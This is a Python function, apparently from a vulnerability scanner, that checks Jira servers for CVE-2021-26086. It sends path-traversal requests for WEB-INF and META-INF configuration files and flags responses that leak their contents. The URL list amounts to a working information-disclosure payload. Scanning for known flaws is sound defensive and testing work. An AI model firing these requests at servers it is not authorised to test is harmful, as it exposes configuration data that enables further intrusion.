import requests
from urllib.parse import urlparse
from colorama import Fore, Style

def check_cve_2021_26086(url):
    """
    Checks for CVE-2021-26086 and returns discovered vulnerabilities.
    """
    print(f"{Fore.YELLOW}\nINFO: Checking for CVE-2021-26086{Style.RESET_ALL}")
    
    vulnerabilities = []  # Initialize the list to store discovered vulnerabilities
    headers = {
        'X-Atlassian-Token': 'no-check'
    }

    # List of URLs to check
    urls_to_check = [
        f"{url.rstrip('/')}/s/cfx/_/;/WEB-INF/web.xml",
        f"{url.rstrip('/')}/s/cfx/_/;/WEB-INF/classes/seraph-config.xml",
        f"{url.rstrip('/')}/s/cfx/_/;/WEB-INF/decorators.xml",
        f"{url.rstrip('/')}/s/cfx/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties",
        f"{url.rstrip('/')}/s/cfx/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.xml",
        f"{url.rstrip('/')}/s/cfx/_/;/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml",
        f"{url.rstrip('/')}/s/cfx/_/;/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.properties",
    ]
    
    for target_url in urls_to_check:
        #print(f"{Fore.YELLOW}\n- Checking URL: {target_url}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}[Testing URL]{Style.RESET_ALL}: {target_url}")
        try:
            # Stream response to handle large files
            response = requests.get(target_url, headers=headers, verify=False, allow_redirects=False, stream=True)
            print(f"{Fore.YELLOW}- HTTP Status Code: {response.status_code}{Style.RESET_ALL}")

            contains_sensitive_data = False  # Flag to check for sensitive data
            
            for chunk in response.iter_lines(decode_unicode=True):
                if response.status_code == 200 and any(keyword in chunk for keyword in ["dependency", "web-app", "filter", "filter-mapping"]):
                    contains_sensitive_data = True
                    break  # Stop further processing if sensitive data is found
                
            if response.status_code == 200:
                if contains_sensitive_data:
                    vulnerability_detail = (
                        f"+ [Information Disclosure] CVE-2021-26086: "
                        f"https://jira.atlassian.com/browse/JRASERVER-72695 "
                        f"Visit the affected URL; the server leaks sensitive information. | URL: {target_url}"
                    )
                    vulnerabilities.append(vulnerability_detail)
                else:
                    print(f"{Fore.BLUE}- NEEDS MANUAL REVIEW - No sensitive information detected at {target_url}{Style.RESET_ALL}")
            
            elif response.status_code == 302:
                location = response.headers.get("Location", "No Location header found") 
                print(f"{Fore.YELLOW}- Redirection Detected (302) for: {target_url}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}- Location Header: {location}")
                if "login.jsp?os_destination=" in location:
                    print(f"{Fore.YELLOW}- Detected redirect to login.jsp - Not VULN{Style.RESET_ALL}")
                else:
                    print(f"{Fore.YELLOW}- This program doesn't follow 302 - Try: curl -k -v '{target_url}'{Style.RESET_ALL}")
            else:
                print(f"{Fore.BLUE}- No vulnerability detected at {target_url}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}* An error occurred while checking {target_url}: {e}{Style.RESET_ALL}")
    
    return vulnerabilities  # Return the full vulnerabilities list
